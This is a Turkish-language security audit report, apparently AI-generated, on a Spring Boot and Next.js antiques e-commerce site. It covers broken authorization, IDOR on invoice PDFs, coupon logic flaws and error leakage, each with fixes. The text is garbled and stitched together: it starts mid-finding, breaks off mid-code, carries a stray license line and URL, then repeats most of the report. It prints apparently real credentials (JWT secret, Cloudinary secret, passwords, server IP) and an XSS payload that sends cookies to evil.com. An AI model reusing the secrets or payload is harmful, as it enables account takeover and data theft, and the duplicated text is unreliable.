    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        
```


## License: Apache-2.0
https://github.com/bettercollected/bettercollected/blob/488dc508c1e666fc17a9d35acf67feea15e8fb0b/webapp/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
